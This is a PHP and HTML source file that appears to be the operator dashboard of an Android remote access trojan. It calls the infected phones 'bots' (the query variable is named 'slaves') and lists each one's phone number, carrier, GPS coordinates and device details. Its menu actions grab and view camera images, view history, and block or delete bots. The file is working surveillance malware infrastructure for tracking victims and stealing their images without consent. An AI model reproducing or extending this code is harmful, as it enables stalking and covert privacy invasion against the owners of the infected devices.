<?php
  $url = "http://pizzachip.com/rat/";

  if (file_exists("config.php")) {
    include("config.php");
  } else {
    die();
  }
  
  include("functions.php");
  
  $getslaves = 'SELECT * FROM bots ORDER BY id';
?>
<!DOCTYPE html>
<html>
  <head>
    <script src="http://code.jquery.com/jquery.js"></script>
	<script src="assets/js/jquery.tablesorter.min.js"></script>
	<script src="assets/js/jquery.tablesorter.widgets.min.js"></script>
	<script>
	    $("#devices").tablesorter({ 
          widgets: ['saveSort'] 
        });

		function deleteBot(UID){
		  var agree=confirm("Are you sure you want to delete this bot?");
		  if (agree){
          } else {
            return;
		  }
		  var xmlhttp;
		  xmlhttp=new XMLHttpRequest();
		  xmlhttp.onreadystatechange=function(){
		    if (xmlhttp.readyState==4 && xmlhttp.status==200){
			  alert(xmlhttp.responseText);
			}
		  }
		  xmlhttp.open("GET","deletebot.php?uid="+UID,true);
          xmlhttp.send();
		}

		function blockBot(UID){
		  var agree=confirm("Are you sure you want to block history updates from this bot?");
		  if (agree){
          } else {
            return;
		  }
		  var xmlhttp;
		  xmlhttp=new XMLHttpRequest();
		  xmlhttp.onreadystatechange=function(){
		    if (xmlhttp.readyState==4 && xmlhttp.status==200){
			  alert(xmlhttp.responseText);
			}
		  }
		  xmlhttp.open("GET","blockbot.php?uid="+UID,true);
          xmlhttp.send();
		}

		function unblockBot(UID){
		  var agree=confirm("Are you sure you want to unblock history updates from this bot?");
		  if (agree){
          } else {
            return;
		  }
		  var xmlhttp;
		  xmlhttp=new XMLHttpRequest();
		  xmlhttp.onreadystatechange=function(){
		    if (xmlhttp.readyState==4 && xmlhttp.status==200){
			  alert(xmlhttp.responseText);
			}
		  }
		  xmlhttp.open("GET","blockbot.php?uid="+UID,true);
          xmlhttp.send();
		}
	</script>
  </head>
  <body>
  <table class="table table-bordered table-hover" id="devices">
    <thead>
		    <tr>
			  <th>#</th>
			  <th>UID</th>
			  <th>Status</th>
			  <th>Last Updated</th>
			  <th>Cell #</th>
			  <th>Cell Provider</th>
			  <th>Location</th>
			  <th>Device</th>
			  <th>SDK</th>
			  <th>Version</th>
			  <th>Add</th>
			</tr>
	</thead>
	<tbody>
  <?php foreach ($connect->query($getslaves) as $row) {
    $today = time();
	$origdate = strtotime($row['update']);
	$secdiff = $today - $origdate;
	$mindiff = $secdiff / 60;

	if ($mindiff > $offlineminutes) {
	  $status = "Offline";
	} else {
	  $status = "Online";
	}
	
	$datetime = new DateTime($row['update']);
	$timezone = new DateTimeZone($timezonesetting);
    $datetime->setTimezone($timezone);
	$lastupdatetime = $datetime->format("Y-m-d H:i:s");
  
echo '<tr ' . ($row['blocked'] == 'yes' ? 'class="danger"' : '') . '><td>' . $row['id'] . '</td>';
	echo '<td>' . $row['uid'] . '</td>';
	echo '<td>' . $status . '</td>';
	echo '<td>' . $lastupdatetime . '</td>';
	echo '<td>' . $row['phone'] . '</td>';
	echo '<td>' . $row['provider'] . '</td>';
	echo '<td>(' . $row['lati'] . ', ' . $row['longi'] . ')</td>';
	echo '<td>' . $row['device'] . '</td>';
	echo '<td>' . $row['sdk'] . '</td>';
	echo '<td>' . $row['version'] . '</td>';
	echo '<td><div class="btn-group addbuttons"><button type="button" id="' . $row['uid'] . '" class="btn btn-default btn-small addselection" onclick="select(\'' . $row['uid'] . '\', ' . $row['lati'] . ',' . $row['longi'] . ')">+</button><button type="button" class="btn btn-default btn-small dropdown-toggle" data-toggle="dropdown"><span class="caret"></span></button><ul class="dropdown-menu"><li><a data-toggle="modal" onclick="$(\'#modaluid\').val(\'' . $row['uid'] . '\')" href="#imageModal"><span class="glyphicon glyphicon-th-large"></span> Get Images</a></li><li><a href="#" data-toggle="modal" data-target="#displayImages" onclick="uid = \'' . $row['uid'] . '\'; refreshImages(); imgrefresh = setInterval(refreshImages, 2000);"><span class="glyphicon glyphicon-th-large"></span> View Images</a></li><li><a href="#" onclick="stoprefresh(); getHistory(\'' . $row['uid'] . '\'); autorefresh(\'' . $row['uid'] . '\');"><span class="glyphicon glyphicon-time"></span> View History</a></li><li><a href="#" onclick="' . ($row['blocked'] == 'yes' ? 'unblock' : 'block') . 'Bot(\'' . $row['uid'] . '\');"><span class="glyphicon glyphicon-remove"></span>' . ($row['blocked'] == 'yes' ? ' Unblock History' : ' Block History') . '</a></li><li><a href="#" onclick="deleteBot(\'' . $row['uid'] . '\');"><span class="glyphicon glyphicon-trash"></span> Delete</a></li></ul></div></td></tr>';
  }?>
    </tbody>
	</table>
  </body>
</html>